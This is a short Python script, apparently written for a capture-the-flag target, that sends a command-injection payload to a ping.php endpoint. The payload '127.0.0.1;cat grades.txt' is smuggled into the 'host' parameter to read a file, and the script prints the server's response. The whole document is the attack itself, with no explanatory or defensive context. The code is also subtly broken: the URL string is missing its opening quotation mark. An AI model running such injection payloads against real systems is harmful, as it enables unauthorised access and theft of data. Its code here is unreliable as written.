import requests

def exploit():
    url = http://xksw-ctf.kuality.kr/ping.php"
    payload = "127.0.0.1;cat grades.txt 1337"

  
    target = f"{url}?host={payload}"
    print(f"[+] Sending exploit to: {target}")

    try:
        r = requests.get(target, timeout=5)

        print("Response:")
        print(r.text)

    except Exception as e:
        print(f"Error: {e}")


if __name__ == "__main__":
    exploit()


